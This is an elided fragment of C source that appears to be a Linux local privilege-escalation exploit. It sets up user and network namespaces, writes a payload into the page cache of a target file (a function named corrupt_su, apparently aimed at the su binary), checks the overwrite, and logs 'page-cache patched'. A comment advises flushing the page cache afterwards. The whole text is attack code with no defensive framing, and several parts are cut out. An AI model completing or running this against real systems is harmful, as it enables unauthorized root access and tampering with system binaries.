...
static int verify_patch(const char *path, size_t offset)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;

    uint8_t got[PAYLOAD_LEN];
    if (pread(fd, got, PAYLOAD_LEN, offset) != PAYLOAD_LEN) {
        close(fd);
        return -1;
    }
    close(fd);

    return memcmp(got, payload, PAYLOAD_LEN) == 0 ? 0 : -1;
}

static int corrupt_su(const char *path)
{
	setup_userns_netns();
	usleep(100 * 1000);
	...
	for (int i = 0; i < PAYLOAD_LEN / 4; i++)
	{
		...
		if (do_one_write(path, off, spi) < 0)
		{
...
// after this run: 
// echo 1 > /proc/sys/vm/drop_caches to flush page cache
...
int main(int argc, char **argv)
{
    ...
    if (path == NULL) {
        SLOG("no suitable target file found");
        return 1;
    }

    SLOG("chose %s to patch", path);
	...
	if (verify_patch(path, PATCH_OFFSET) != 0) {
		SLOG("post-write verify failed (target %s unchanged)", path);
		return 1;
	}
	SLOG("%s page-cache patched", path);
